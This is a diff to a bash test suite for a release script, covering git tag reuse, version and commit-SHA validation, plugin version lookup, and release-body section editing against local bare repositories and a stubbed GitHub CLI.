 check "tags: origin has no tag" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
-check "tags: origin/main is untouched" "$(is "$(origin_version "$work/t")" 1.0.0)"
-check "tags: the bump commit changes the manifest and the lockfile" \
-  "$(is "$(git -C "$clone" diff --name-only HEAD^ HEAD)" "bun.lock"$'\n'"packages/pkg/package.json")"
-check "tags: the lockfile's workspace entry takes the version" "$(is "$(lock_version "$clone" HEAD)" 1.0.1)"
-check "tags: the lockfile changes in that one line, the decoys untouched" \
-  "$(is "$(git -C "$clone" diff --numstat HEAD^ HEAD -- bun.lock)|$(lock_version "$clone" HEAD packages/pkg-ui)" "1	1	bun.lock|1.0.0")"
-check "tags: no temporary file is left in the checkout" "$(is "$(git -C "$clone" status --porcelain --ignored)" "")"
+check "tags: origin/main is untouched" "$(is "$(git -C "$work/t/origin.git" rev-parse main)" "$run")"
 tag_run "$clone" 1.0.1 pkg-v1.0.1
-check "the same version again: exits 0, reusing the tag" "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')" '0|true')"
-check "the same version again: still nothing on origin" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
-tag_run "$clone" 1.0.2 pkg-v1.0.1
-check "another version under the existing tag: exits 1 naming both versions" \
-  "$(is "$rc|$(contains "$out" '^::error::tag pkg-v1\.0\.1 already exists with version 1\.0\.1, not 1\.0\.2$')" '1|true')"
-# The lockfile without an entry for the package: nothing is committed or tagged.
+check "the tag already on this commit: exits 0, reusing it" \
+  "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')" '0|true')"
+check "the tag already on this commit: still no commit, and still nothing on origin" \
+  "$(is "$(state "$clone")|$(git -C "$work/t/origin.git" tag -l)" "$before|")"
+# The tag on another commit: the run releases a commit the tag does not name.
+change "$clone" packages/pkg/index.js "fix: a later commit"
+later=$(git -C "$clone" rev-parse HEAD)
+before=$(state "$clone")
+tag_run "$clone" 1.0.1 pkg-v1.0.1
+check "the tag on another commit: exits 1" "$(is "$rc" 1)"
+check "the tag on another commit: the error names both commits" \
+  "$(contains "$out" "^::error::release-push\.sh tag: tag pkg-v1\.0\.1 already exists on $run, not $later, the commit this run releases$")"
+check "the tag on another commit: the tag still names the commit it named" \
+  "$(is "$(git -C "$clone" rev-list -n 1 pkg-v1.0.1)" "$run")"
+check "the tag on another commit: nothing else is tagged and nothing is committed" \
+  "$(is "$(git -C "$clone" tag -l)|$(state "$clone")" "pkg-v1.0.1|$before")"
+# A version that is not X.Y.Z, each refused before anything is tagged.
+for v in 1.0 1.0.1-rc.1 01.0.0; do
+  tag_run "$clone" "$v" "pkg-v$v"
+  check "a version that is not X.Y.Z ($v): exits 1" "$(is "$rc" 1)"
+  check "a version that is not X.Y.Z ($v): the error names it" \
+    "$(contains "$out" "^::error::release-push.sh tag: the release version ${v//./\\.} is not X\.Y\.Z")"
+  check "a version that is not X.Y.Z ($v): nothing is tagged" "$(is "$(git -C "$clone" tag -l)" pkg-v1.0.1)"
+done
+# A $GITHUB_SHA that is not a commit sha: empty, not hex, short, or upper-case hex.
+for bad in '' not-a-sha "${run:0:12}" "${run^^}"; do
+  printf -v shown '%q' "$bad"
+  tag_run "$clone" 1.0.2 pkg-v1.0.2 "$bad"
+  check "a \$GITHUB_SHA that is not 40 lower-case hex ($shown): exits 1" "$(is "$rc" 1)"
+  check "a \$GITHUB_SHA that is not 40 lower-case hex ($shown): the error names it" \
+    "$(contains "$out" '^::error::release-push.sh tag: GITHUB_SHA names the commit this run releases; ')"
+  check "a \$GITHUB_SHA that is not 40 lower-case hex ($shown): nothing is tagged" "$(is "$(git -C "$clone" tag -l)" pkg-v1.0.1)"
+done
+set +e
+out=$(cd "$clone" && env -u GITHUB_SHA "$release_push" tag 1.0.2 pkg-v1.0.2 2>&1)
+rc=$?
+set -e
+check "an unset \$GITHUB_SHA: exits 1 naming it, with nothing tagged" \
+  "$(is "$rc|$(contains "$out" '^::error::release-push.sh tag: GITHUB_SHA names the commit this run releases; ')|$(git -C "$clone" tag -l)" '1|true|pkg-v1.0.1')"
+# The tags are fetched, so a tag another attempt pushed since the checkout is seen: one on this
+# run's commit is reused, one on another commit is refused.
 setup "$work/t2"
-clone="$work/t2/a"
-sed -i 's|^    "packages/pkg": {$|    "packages/pkg-renamed": {|' "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: rename the entry"
-tag_run "$clone" 1.0.1 pkg-v1.0.1
-check "no entry in the lockfile: exits 1 naming the lockfile and the entry" \
-  "$(is "$rc|$(contains "$out" '^::error::release-push.sh tag: bun\.lock holds no workspace entry "packages/pkg" with one "version" line, so the bump cannot set it to 1\.0\.1$')" '1|true')"
-check "no entry in the lockfile: nothing is committed, tagged or left behind" \
-  "$(is "$(git -C "$clone" log -1 --format=%s)|$(git -C "$clone" tag -l)|$(git -C "$clone" status --porcelain)" "chore: rename the entry|| M packages/pkg/package.json")"
-# A lockfile whose last line has no newline keeps it so: the bump changes the one
-# line, push-main lands it, and a bump that also adds the newline is refused.
-setup "$work/t3"
-clone="$work/t3/a"
-printf '%s' "$(<"$clone/bun.lock")" > "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: a lockfile without a final newline"
-git -C "$clone" push -q origin main
-tag_run "$clone" 1.0.1 pkg-v1.0.1
-check "no final newline: tag exits 0" "$(is "$rc" 0)"
-check "no final newline: the bump changes one line of the lockfile, which still ends without a newline" \
-  "$(is "$(git -C "$clone" diff --numstat HEAD^ HEAD -- bun.lock)|$(git -C "$clone" show HEAD:bun.lock | tail -c 1)" "1	1	bun.lock|}")"
-deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-main packages/pkg 1.0.1
-check "no final newline: push-main lands the bump" "$(is "$rc|$(lock_version "$work/t3/origin.git" main)" "0|1.0.1")"
-clone="$work/t3/b"
-git -C "$clone" pull -q origin main
-set_version "$clone" 1.0.2
-set_lock_version "$clone" 1.0.2
-printf '\n' >> "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: release pkg v1.0.2 [skip ci]"
-deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-main packages/pkg 1.0.2
-check "no final newline: push-main refuses a bump that adds one" \
-  "$(is "$rc|$(contains "$out" "^::error::HEAD's bun\.lock differs from its parent's in more than the version line")" "1|true")"
-# A backslash in the package dir is taken literally: packages/pk\g is not packages/pkg.
-setup "$work/t4"
-clone="$work/t4/a"
-mkdir "$clone/packages/pk\\g"
-printf '{\n  "name": "pkg-backslash",\n  "version": "1.0.0"\n}\n' > "$clone/packages/pk\\g/package.json"
-git -C "$clone" add -A
-git -C "$clone" commit -q -m "feat: a package dir with a backslash"
-tag_run "$clone" 1.0.1 pkg-v1.0.1 'packages/pk\g' pkg-backslash
-check "a backslash in the package dir: tag refuses, finding no entry of that name" \
-  "$(is "$rc|$(contains "$out" 'bun\.lock holds no workspace entry "packages/pk\\g"')" "1|true")"
-check "a backslash in the package dir: packages/pkg's entry is untouched" "$(is "$(lock_version "$clone" HEAD)|$(git -C "$clone" diff --quiet -- bun.lock && echo clean)" "1.0.0|clean")"
+run=$(git -C "$work/t2/a" rev-parse HEAD)
+git -C "$work/t2/b" tag pkg-v1.2.0
+git -C "$work/t2/b" push -q origin pkg-v1.2.0
+before=$(state "$work/t2/a")
+tag_run "$work/t2/a" 1.2.0 pkg-v1.2.0
+check "a tag another attempt pushed for this commit: fetched and reused" \
+  "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.2\.0 already exists for version 1\.2\.0; reusing it$')|$(state "$work/t2/a")" "0|true|$before")"
+change "$work/t2/b" README.md "fix: another commit"
+other=$(git -C "$work/t2/b" rev-parse HEAD)
+git -C "$work/t2/b" tag pkg-v1.3.0
+git -C "$work/t2/b" push -q origin pkg-v1.3.0
+tag_run "$work/t2/a" 1.3.0 pkg-v1.3.0
+check "a tag another run pushed for another commit: refused, naming both" \
+  "$(is "$rc|$(contains "$out" "^::error::release-push\.sh tag: tag pkg-v1\.3\.0 already exists on $other, not $run, the commit this run releases$")" '1|true')"
+check "a tag another run pushed for another commit: the clone made no tag of its own" \
+  "$(is "$(git -C "$work/t2/a" tag -l)" "pkg-v1.2.0"$'\n'"pkg-v1.3.0")"
+check "tag pushes nothing: origin holds only the tags the other clone pushed" \
+  "$(is "$(git -C "$work/t2/origin.git" tag -l)" "pkg-v1.2.0"$'\n'"pkg-v1.3.0")"
 
 echo
 echo "Case: one publish job releases two packages from the run's commit"
 # release.yaml's publish job releases its packages one after another from one checkout, each from
-# the run's commit: `git checkout --force --detach "$GITHUB_SHA"` and `git clean -ffdx`, then "Set
-# release version", `tag`, `push-tag` and `push-main`, here each through the script under test
-# against a bare origin standing in for GitHub. The run's commit R holds a fix for each of two
-# packages, pkg and other: pkg's bump lands on R as it is, other's is rebased onto it, and each tag
-# stays on its own un-rebased bump commit, a child of R, where a re-run's version step finds it. A
-# re-run repeats every step and changes nothing on origin. The same re-run without the detach
-# between the packages is the control: pkg's push-main pushes nothing (main holds 1.0.1), so pkg's
-# re-made bump commit stays off main, other's `tag` commits on top of it, and other's push-main
-# refuses a HEAD two commits over main. Each re-run's bump is committed at a fixed earlier date, as
-# in case 7, so it is a commit of its own, as a re-run's is.
+# the run's commit: `git checkout --force --detach "$GITHUB_SHA"` and `git clean -ffdx`, then
+# `tag` and `push-tag`, here each through the script under test against a bare origin standing in
+# for GitHub. The run's commit R holds a fix for each of two packages, pkg and other: each tag
+# names R itself and no commit is made, so main's tip stays R, and a re-run finds each tag where
+# the first attempt left it, adds no commit of its own and changes nothing on origin.
 pj="$work/pj"
 setup "$pj"
 git -C "$pj/a" tag pkg-v1.0.0
@@ -1167,110 +658,127 @@ from_run() {
   git -C "$1" checkout -q --force --detach "$run"
   git -C "$1" clean -q -ffdx
 }
-# publish_package <clone> <package-dir> <name> <version> <tag>: one package's steps after its
-# hand-over check, from wherever <clone>'s HEAD is: "Set release version", `tag`, `push-tag` and
-# `push-main`, stopping at the first that fails. Leaves the failed step's name in failed (empty
-# when every step succeeded), the output of `tag` in tag_out, rc and out from the last step run,
-# and in pushed how many of its pushes reached origin.
+# publish_package <clone> <version> <tag>: one package's steps after its hand-over check, from the
+# run's commit: `tag`, then `push-tag`, stopping at the first that fails. Leaves the failed step's
+# name in failed (empty when every step succeeded), the output of `tag` in tag_out, rc and out
+# from the last step run, and in pushed how many of its pushes reached origin.
 publish_package() {
-  local clone=$1 package_dir=$2 name=$3 v=$4 tag=$5
+  local clone=$1 v=$2 tag=$3
   failed='' pushed=0
-  tag_run "$clone" "$v" "$tag" "$package_dir" "$name"
+  tag_run "$clone" "$v" "$tag" "$run"
   tag_out=$out
   [ "$rc" = 0 ] || { failed=tag; return 0; }
-  deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-tag "$tag"
+  deploy_run "$clone" -- push-tag "$tag"
   [ -z "$seen" ] || pushed=$((pushed + 1))
-  [ "$rc" = 0 ] || { failed=push-tag; return 0; }
-  deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-main "$package_dir" "$v"
-  [ -z "$seen" ] || pushed=$((pushed + 1))
-  [ "$rc" = 0 ] || failed=push-main
+  [ "$rc" = 0 ] || failed=push-tag
 }
-# only_version <repo> <commit> <package-dir> <version>: true when <commit>'s manifest is its
-# parent's with .version set to <version> and nothing else, as JSON, and its bun.lock is its
-# parent's with one line changed, the package's workspace entry's, to <version>.
-only_version() {
-  local repo=$1 commit=$2 dir=$3 v=$4
-  is "$(git -C "$repo" show "$commit^:$dir/package.json" | jq -S --arg v "$v" '.version = $v')|1	1	bun.lock|$v" \
-    "$(git -C "$repo" show "$commit:$dir/package.json" | jq -S .)|$(git -C "$repo" diff --numstat "$commit^" "$commit" -- bun.lock)|$(lock_version "$repo" "$commit" "$dir")"
-}
-# origin_refs: every ref origin holds, with the object it names.
-origin_refs() { git -C "$pj/origin.git" for-each-ref --format='%(refname) %(objectname)'; }
+# publish_refs: every ref the publish-job case's origin holds, with the object it names.
+publish_refs() { git -C "$pj/origin.git" for-each-ref --format='%(refname) %(objectname)'; }
 o="$pj/origin.git"
-pkg_subject="chore: release pkg v1.0.1 [skip ci]"
-other_subject="chore: release other v2.0.1 [skip ci]"
 
 # The run: its build jobs read the version from the run's commit, then publish releases both.
 git clone -q "$o" "$pj/job"
-version_run "$pj/job" pkg-v --package-dir packages/pkg -- packages/pkg/
+version_run "$pj/job" pkg-v -- packages/pkg/
 check "the build of pkg: releases 1.0.1" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
-version_run "$pj/job" other-v --package-dir packages/other -- packages/other/
+version_run "$pj/job" other-v -- packages/other/
 check "the build of other: releases 2.0.1" "$(is "$rc $out" "0 $(outputs 2.0.1 other-v2.0.1 false)")"
 from_run "$pj/job"
-publish_package "$pj/job" packages/pkg pkg 1.0.1 pkg-v1.0.1
-check "first attempt, pkg: every step succeeds, its tag and its bump each pushed" "$(is "$failed|$pushed" "|2")"
+before=$(state "$pj/job")
+publish_package "$pj/job" 1.0.1 pkg-v1.0.1
+check "first attempt, pkg: every step succeeds, its tag pushed" "$(is "$failed|$pushed" "|1")"
 from_run "$pj/job"
-publish_package "$pj/job" packages/other other 2.0.1 other-v2.0.1
-check "first attempt, other: every step succeeds, its tag and its bump each pushed" "$(is "$failed|$pushed" "|2")"
-pkg_bump=$(git -C "$o" rev-parse -q --verify 'pkg-v1.0.1^{commit}' || true)
-other_bump=$(git -C "$o" rev-parse -q --verify 'other-v2.0.1^{commit}' || true)
-check "first attempt: main holds pkg's bump, then other's, over the run's commit" \
-  "$(is "$(git -C "$o" log --format=%s "$run..main")|$(git -C "$o" rev-parse main~2)" "$other_subject"$'\n'"$pkg_subject|$run")"
-check "first attempt: main's pkg bump changes only packages/pkg/package.json's .version and its bun.lock line" \
-  "$(is "$(git -C "$o" diff --name-only main~2 main~1)|$(only_version "$o" main~1 packages/pkg 1.0.1)" "bun.lock"$'\n'"packages/pkg/package.json|true")"
-check "first attempt: main's other bump, rebased onto pkg's, changes only packages/other/package.json's .version and its bun.lock line" \
-  "$(is "$(git -C "$o" diff --name-only main~1 main)|$(only_version "$o" main packages/other 2.0.1)" "bun.lock"$'\n'"packages/other/package.json|true")"
-check "first attempt: main's bun.lock holds both versions" \
-  "$(is "$(lock_version "$o" main packages/pkg) $(lock_version "$o" main packages/other)" "1.0.1 2.0.1")"
-check "first attempt: pkg's tag names its bump commit, a child of the run's commit, which main carries as it is" \
-  "$(is "$(git -C "$o" rev-parse "$pkg_bump^")|$pkg_bump" "$run|$(git -C "$o" rev-parse main~1)")"
-check "first attempt: other's tag names its un-rebased bump commit, a child of the run's commit, not main's rebased one" \
-  "$(is "$(git -C "$o" rev-parse "$other_bump^")|$([ "$other_bump" != "$(git -C "$o" rev-parse main)" ] && echo apart)" "$run|apart")"
-check "first attempt: other's tagged bump changes only packages/other/package.json's .version and its bun.lock line" \
-  "$(is "$(git -C "$o" diff --name-only "$run" "$other_bump")|$(only_version "$o" "$other_bump" packages/other 2.0.1)" "bun.lock"$'\n'"packages/other/package.json|true")"
-refs=$(origin_refs)
+publish_package "$pj/job" 2.0.1 other-v2.0.1
+check "first attempt, other: every step succeeds, its tag pushed" "$(is "$failed|$pushed" "|1")"
+check "first attempt: each tag on origin names the run's commit" \
+  "$(is "$(git -C "$o" rev-list -n 1 pkg-v1.0.1) $(git -C "$o" rev-list -n 1 other-v2.0.1)" "$run $run")"
+check "first attempt: origin's main is still the run's commit" "$(is "$(git -C "$o" rev-parse main)" "$run")"
+check "first attempt: the clone added no commit, and left the manifests and the lockfile as they were" \
+  "$(is "$(state "$pj/job")" "$before")"
+check "first attempt: the pushes went through the deploy key" "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
+refs=$(publish_refs)
 
 # A re-run: the same commit, with every tag the first attempt pushed.
 git clone -q "$o" "$pj/rerun"
 git -C "$pj/rerun" checkout -q --detach "$run"
 git -C "$pj/rerun" fetch -q --tags origin
-version_run "$pj/rerun" pkg-v --package-dir packages/pkg -- packages/pkg/
+version_run "$pj/rerun" pkg-v -- packages/pkg/
 check "re-run, the build of pkg: releases pkg-v1.0.1 again" \
   "$(is "$rc|$out|$(contains "$err" '^Releasing pkg-v1\.0\.1, already pushed for this checkout$')" "0|$(outputs 1.0.1 pkg-v1.0.1 false)|true")"
-version_run "$pj/rerun" other-v --package-dir packages/other -- packages/other/
+version_run "$pj/rerun" other-v -- packages/other/
 check "re-run, the build of other: releases other-v2.0.1 again" \
   "$(is "$rc|$out|$(contains "$err" '^Releasing other-v2\.0\.1, already pushed for this checkout$')" "0|$(outputs 2.0.1 other-v2.0.1 false)|true")"
 from_run "$pj/rerun"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/rerun" packages/pkg pkg 1.0.1 pkg-v1.0.1
-check "re-run, pkg: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
+before=$(state "$pj/rerun")
+publish_package "$pj/rerun" 1.0.1 pkg-v1.0.1
+check "re-run, pkg: every step succeeds" "$(is "$failed" "")"
 check "re-run, pkg: tag reuses its own tag" "$(contains "$tag_out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')"
-check "re-run, pkg: push-main says main already holds the version" \
-  "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package\.json and bun\.lock already hold v1\.0\.1")"
 from_run "$pj/rerun"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/rerun" packages/other other 2.0.1 other-v2.0.1
-check "re-run, other: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
+publish_package "$pj/rerun" 2.0.1 other-v2.0.1
+check "re-run, other: every step succeeds" "$(is "$failed" "")"
 check "re-run, other: tag reuses its own tag" "$(contains "$tag_out" '^Tag other-v2\.0\.1 already exists for version 2\.0\.1; reusing it$')"
-check "re-run, other: push-main says main already holds the version" \
-  "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/other/package\.json and bun\.lock already hold v2\.0\.1")"
-check "re-run: origin's main and tags are unchanged" "$(is "$(origin_refs)" "$refs")"
+check "re-run: no commit is added to the clone" "$(is "$(state "$pj/rerun")" "$before")"
+check "re-run: origin's main and tags are unchanged" "$(is "$(publish_refs)" "$refs")"
 
-# The control: the same re-run from one clone, without the detach between the packages.
-git clone -q "$o" "$pj/control"
-git -C "$pj/control" checkout -q --detach "$run"
-git -C "$pj/control" fetch -q --tags origin
-from_run "$pj/control"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/control" packages/pkg pkg 1.0.1 pkg-v1.0.1
-check "no detach between packages, pkg: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/control" packages/other other 2.0.1 other-v2.0.1
-check "no detach between packages, other: tag commits its bump on top of pkg's, over the run's commit" \
-  "$(is "$(git -C "$pj/control" log --format=%s -2 HEAD)|$(git -C "$pj/control" rev-parse HEAD~2)" "$other_subject"$'\n'"$pkg_subject|$run")"
-check "no detach between packages, other: push-main refuses, no push reaching origin" "$(is "$failed|$pushed" "push-main|0")"
-check "no detach between packages, other: the error says HEAD carries 2 commits main does not" \
-  "$(contains "$out" '^::error::HEAD carries 2 commits main does not .* chore: release other v2\.0\.1 \[skip ci\]; [0-9a-f]* chore: release pkg v1\.0\.1 \[skip ci\]')"
-check "no detach between packages: origin's main and tags are unchanged" "$(is "$(origin_refs)" "$refs")"
+echo
+echo "Case: pair-version prints a plugin's released version, else its newest tag's, and refuses a released version that is not X.Y.Z"
+# A release commits nothing, so a package's committed manifest keeps whatever version was last
+# written to it and the tags alone say what npm carries. release.yaml's two steps —
+# legion_build's "Resolve plugin versions for the smoke test and worker image" and publish's
+# "Check the plugin pair npm carries" — each work out what their own run released and hand that
+# over; this command answers from the tags when they hand over nothing.
+pm="$work/pair"
+mkdir -p "$pm/packages/pi-envoy"
+git init -q -b main "$pm"
+identity "$pm"
+printf '{\n  "name": "@sjawhar/pi-envoy",\n  "version": "0.9.0"\n}\n' > "$pm/packages/pi-envoy/package.json"
+git -C "$pm" add -A
+git -C "$pm" commit -q -m "seed"
+git -C "$pm" tag pi-envoy-v1.9.0
+git -C "$pm" tag pi-envoy-v1.10.0
+# pair_version <arg>...: runs `release-push.sh pair-version <arg>...` in that repository; leaves
+# its exit code in rc, its stdout in out and its stderr in err.
+pair_version() {
+  set +e
+  out=$(cd "$pm" && "$release_push" pair-version "$@" 2>"$work/pair.err")
+  rc=$?
+  set -e
+  err=$(<"$work/pair.err")
+}
+pair_version pi-envoy-v 1.11.0
+check "a released version: that version, not the newest tag's" "$(is "$rc|$out" "0|1.11.0")"
+pair_version pi-envoy-v ''
+check "a package that released nothing: the newest tag's version, not the manifest's older one" \
+  "$(is "$rc|$out" "0|1.10.0")"
+pair_version pi-envoy-v
+check "no released version at all: the same newest tag's version" "$(is "$rc|$out" "0|1.10.0")"
+# A released version that is not X.Y.Z is refused rather than falling through to the newest tag:
+# the caller means a release it just made, and the fall-through would link the previous plugin
+# with no word said. Only an empty value falls through, which is the two steps' "this run
+# released nothing".
+for bad in 1.11 v1.11.0 1.11.0-rc.1 01.11.0 ' '; do
+  pair_version pi-envoy-v "$bad"
+  printf -v shown '%q' "$bad"
+  check "a released version that is not X.Y.Z ($shown): refused, printing nothing" \
+    "$(is "$rc|$out|$(contains "$err" "^::error::release-push\.sh pair-version: the released version .* is not X\.Y\.Z, each field a number without leading zeros; refusing it\$")" "1||true")"
+done
+# A newest tag whose name is no release, and no tag at all: each prints nothing, which the two
+# steps' ::error::Could not resolve guards refuse.
+git -C "$pm" tag -d pi-envoy-v1.10.0 >/dev/null
+git -C "$pm" tag -d pi-envoy-v1.9.0 >/dev/null
+git -C "$pm" tag pi-envoy-v1.9.0-rc.1
+pair_version pi-envoy-v ''
+check "the newest tag is no release: prints nothing" "$(is "$rc|$out" "0|")"
+pair_version pi-envoy-v 1.11.0
+check "the newest tag is no release, with a released version: that version" "$(is "$rc|$out" "0|1.11.0")"
+git -C "$pm" tag -d pi-envoy-v1.9.0-rc.1 >/dev/null
+pair_version pi-envoy-v ''
+check "no tag of the prefix at all: prints nothing" "$(is "$rc|$out" "0|")"
+pair_version
+check "no tag prefix: refused, naming the usage" \
+  "$(is "$rc|$out|$(contains "$err" '^::error::release-push\.sh pair-version: usage: release-push\.sh pair-version <tag-prefix> \[<released version>\]$')" "1||true")"
+pair_version pi-envoy-v 1.11.0 extra
+check "an argument past the released version: refused, naming the usage" \
+  "$(is "$rc|$out|$(contains "$err" '^::error::release-push\.sh pair-version: usage')" "1||true")"
 
 echo
 echo "Case 11: release creates a missing release, publishes a draft, and reuses a published one"
@@ -1279,28 +787,41 @@ echo "Case 11: release creates a missing release, publishes a draft, and reuses 
 # shows up as a different log line. `gh release view <tag> ... --json isDraft
 # -q .isDraft` answers for $GH_TEST_RELEASE: none (exit 1, as gh does for a
 # missing release), draft or published (true or false), or odd (a value gh
-# never prints). An upload, edit or create fails when $GH_TEST_FAIL names it.
-# Any other call fails as unexpected, so a call the command should not make
-# shows up as an error.
+# never prints); `--json body -q .body` prints $GH_TEST_DIR/body.md, the
+# release's body as the case left it, for the release-section cases below. An
+# upload, edit or create fails when $GH_TEST_FAIL names it, and the file an
+# edit's --notes-file names is copied to $GH_TEST_DIR/edited.md, the body that
+# edit would write. Any other call fails as unexpected, so a call the command
+# should not make shows up as an error.
 mkdir -p "$work/bin"
 cat > "$work/bin/gh" <<'GH'
 #!/usr/bin/env bash
 { printf '[%s]' "$@"; printf '\n'; } >> "$GH_TEST_DIR/calls"
 case "$1 $2" in
   "release view")
-    [[ " $* " == *" --json isDraft -q .isDraft "* ]] || { echo "view without --json isDraft: $*" >&2; exit 3; }
-    case $GH_TEST_RELEASE in
-      none) echo "release not found" >&2; exit 1 ;;
-      draft) echo true ;;
-      published) echo false ;;
-      odd) echo null ;;
-      *) echo "unknown GH_TEST_RELEASE $GH_TEST_RELEASE" >&2; exit 3 ;;
-    esac ;;
+    if [[ " $* " == *" --json body -q .body "* ]]; then
+      cat "$GH_TEST_DIR/body.md"
+    elif [[ " $* " == *" --json isDraft -q .isDraft "* ]]; then
+      case $GH_TEST_RELEASE in
+        none) echo "release not found" >&2; exit 1 ;;
+        draft) echo true ;;
+        published) echo false ;;
+        odd) echo null ;;
+        *) echo "unknown GH_TEST_RELEASE $GH_TEST_RELEASE" >&2; exit 3 ;;
+      esac
+    else
+      echo "view without --json isDraft or --json body: $*" >&2
+      exit 3
+    fi ;;
   "release upload" | "release edit" | "release create")
     if [ "$GH_TEST_FAIL" = "$2" ]; then
       echo "HTTP 502: the test failed this $2" >&2
       exit 1
-    fi ;;
+    fi
+    while [ $# -gt 1 ]; do
+      [ "$1" != --notes-file ] || cp "$2" "$GH_TEST_DIR/edited.md"
+      shift
+    done ;;
   *) echo "unexpected gh call: $*" >&2; exit 3 ;;
 esac
 GH
@@ -1363,6 +884,170 @@ release_run none "" pkg-v1.0.1 "Pkg v1.0.1"
 check "no asset: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"
 release_run none "" --draft pkg-v1.0.1 "Pkg v1.0.1" a.tgz
 check "an unknown option: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"
+
+echo
+echo "Case 11a: release-section writes one section into the release's body, replacing the one it holds"
+# The content a changelog step hands over: markdown of its own, with "###" headings and list
+# items, which must reach the body unchanged.
+entries="$work/section-entries.md"
+printf '### Added\n\n- an entry\n- another entry\n\n### Fixed\n\n- a bug\n' > "$entries"
+: > "$work/section-stdin.md"
+# section_run <arg>...: runs `release-push.sh release-section pkg-v1.0.1 <arg>...` against the
+# stub, which answers the body view with $work/body.md as the case left it, and with standard
+# input from $work/section-stdin.md, empty unless the case wrote it; leaves its exit code in rc,
+# its combined output in out, the stub's call log in calls and the body the edit was handed in
+# edited, emptied first so a case can tell that no edit came.
+section_run() {
+  rm -f "$work/edited.md"
+  : > "$work/calls"
+  set +e
+  out=$(cd "$work" && GITHUB_REPOSITORY=example/repo GH_TEST_DIR="$work" GH_TEST_RELEASE=published \
+    GH_TEST_FAIL='' PATH="$work/bin:$PATH" "$release_push" release-section pkg-v1.0.1 "$@" \
+    < "$work/section-stdin.md" 2>&1)
+  rc=$?
+  set -e
+  calls=$(<"$work/calls")
+  edited=''
+  [ ! -e "$work/edited.md" ] || edited=$(<"$work/edited.md")
+}
+# edited_is <kept> <heading> <content-file>: true when the body the edit was handed holds, byte
+# for byte, <kept> — the body's other lines as release-section keeps them, empty for none — then
+# the heading, a blank line and the content file.
+edited_is() {
+  { [ -z "$1" ] || printf '%s\n\n' "$1"; printf '%s\n\n' "$2"; cat "$3"; } > "$work/expected-body.md"
+  cmp -s "$work/edited.md" "$work/expected-body.md" && echo true || echo false
+}
+body_view=$(argv release view pkg-v1.0.1 --repo example/repo --json body -q .body)
+# The edit's --notes-file names a file under the command's own temporary directory, so the log
+# line is read by its shape; one_edit: the body view and one edit, and nothing else.
+notes_edit='^\[release\]\[edit\]\[pkg-v1\.0\.1\]\[--repo\]\[example/repo\]\[--notes-file\]\[/'
+one_edit() { is "$(grep -c . <<<"$calls")|$(contains "$calls" "$notes_edit")" '2|true'; }
+# A body holding no such section: the section is appended under its heading, and every other line
+# is kept as it was.
+printf 'Pkg v1.0.1, built from the tag.\n\n## Worker image\n\n`ghcr.io/example/worker@sha256:a1`\n' > "$work/body.md"
+kept=$(<"$work/body.md")
+section_run '## Changelog' "$entries"
+check "no such section: exits 0, viewing the body and editing it once" "$(is "$rc|$(one_edit)" '0|true')"
+check "no such section: the section is appended, the body's other lines kept byte for byte" \
+  "$(edited_is "$kept" '## Changelog' "$entries")"
+check "no such section: says it wrote the section" \
+  "$(contains "$out" '^Wrote the ## Changelog section into the body of release pkg-v1\.0\.1$')"
+check "no such section: the content's own markdown goes through unchanged" \
+  "$(is "$(contains "$edited" '^### Added$')|$(contains "$edited" '^- another entry$')|$(contains "$edited" '^### Fixed$')" 'true|true|true')"
+# The same body, now holding that section with other content, between two others.
+printf 'Pkg v1.0.1, built from the tag.\n\n## Changelog\n\n### Added\n\n- an older entry\n\n## Worker image\n\n`ghcr.io/example/worker@sha256:a1`\n' > "$work/body.md"
+section_run '## Changelog' "$entries"
+check "a section already there: exits 0, viewing the body and editing it once" "$(is "$rc|$(one_edit)" '0|true')"
+check "a section already there: replaced, the body's other lines in their order and the next heading kept" \
+  "$(edited_is "$kept" '## Changelog' "$entries")"
+check "a section already there: nothing of what it held is left" "$(is "$(contains "$edited" 'an older entry')" false)"
+# The body already holding exactly what would be written, which a re-run of the step hands over
+# again: nothing is edited, a difference in trailing newlines alone included.
+cp "$work/expected-body.md" "$work/body.md"
+section_run '## Changelog' "$entries"
+check "a body already holding it: exits 0, viewing the body and editing nothing" "$(is "$rc|$calls|$edited" "0|$body_view|")"
+check "a body already holding it: says the release already holds it" \
+  "$(contains "$out" '^Release pkg-v1\.0\.1 already holds this ## Changelog section$')"
+printf '\n\n' >> "$work/body.md"
+section_run '## Changelog' "$entries"
+check "a body differing in trailing newlines alone: still edits nothing" "$(is "$rc|$calls" "0|$body_view")"
+# The section at the end of the body, and one followed by a heading of level one.
+printf 'Lead sentence.\n\n## Changelog\n\n- an older entry\n' > "$work/body.md"
+section_run '## Changelog' "$entries"
